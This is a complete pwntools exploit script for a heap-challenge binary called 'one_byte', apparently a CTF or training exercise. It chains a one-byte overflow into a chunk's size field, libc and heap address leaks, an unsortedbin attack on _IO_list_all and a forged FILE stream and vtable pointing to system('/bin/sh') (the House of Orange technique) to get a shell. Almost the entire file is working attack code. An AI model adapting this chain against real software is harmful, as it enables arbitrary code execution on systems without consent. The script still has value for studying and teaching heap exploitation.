#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("one_byte")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option.
# Returns chunk index.
def malloc():
    global index
    io.sendthen(b"> ", b"1")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "read" option; read 0x58 bytes.
def read(index):
    io.send(b"4")
    io.sendafter(b"index: ", f"{index}".encode())
    r = io.recv(0x58)
    io.recvuntil(b"> ")
    return r

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- LEAK THE UNSORTEDBIN ADDRESS -=-=-=

# Request 5 chunks.
chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()
chunk_D = malloc()
chunk_E = malloc()

# Overflow from chunk A into chunk B's size field.
edit(chunk_A, b"Y"*88 + p8(0xc1))

# Chunk B is now a 0xc0 chunk, the sum of 2 0x60 chunks.

# Free chunk B into the unsortedbin.
free(chunk_B)

# This request remainders chunk B, writing unsortedbin metadata into chunk C.
chunk_B = malloc()

# Leak the main arena's unsortedbin address via chunk C.
libc.address = u64(read(chunk_C)[:8]) - (libc.sym.main_arena + 0x58)
info(f"libc @ 0x{libc.address:02x}")


# =-=-=- LEAK A HEAP ADDRESS -=-=-=

# Request the remainder that overlaps chunk C.
chunk_C2 = malloc()

# Free chunk A then C2, writing fastbin metadata into chunk C.
free(chunk_A)
free(chunk_C2)

# Leak a heap address via chunk C.
heap = u64(read(chunk_C)[:8])
info(f"heap @ 0x{heap:02x}")


# =-=-=- PREPARE TO TAMPER WITH UNSORTEDBIN METADATA -=-=-=

# Return chunk C2 from the fastbins, followed by chunk A.
chunk_C2 = malloc()
chunk_A = malloc()

# Once again leverage an overflow from chunk A  into chunk B's size field.
edit(chunk_A, b"Y"*88 + p8(0xc1))

# Free chunk B into the unsortedbin again.
free(chunk_B)

# Remainder chunk B again.
chunk_B = malloc()

# Now an unsorted chunk overlaps chunk C, in preparation for an unsortedbin attack.


# =-=-=- PREPARE UNSORTEDBIN ATTACK & FAKE FILE STREAM -=-=-=

# Write the string "/bin/sh" into the file stream's _flags field.
edit(chunk_B, p64(0)*10 + b"/bin/sh\0")

# Overwrite the unsorted chunk's bk & ensure _IO_write_ptr > _IO_write_base.
# The _mode field is already null thanks to calloc().
edit(chunk_C, p64(0) + p64(libc.sym._IO_list_all - 16) + p64(1) + p64(2))

# Forge a vtable pointer and vtable, in this case the vtable overlaps the
# _unused2 field of the file stream to save space.
edit(chunk_E, p64(libc.sym.system) + p64(heap + 0x178))


# =-=-=- TRIGGER HOUSE OF ORANGE -=-=-=

malloc()

# =============================================================================

io.interactive()
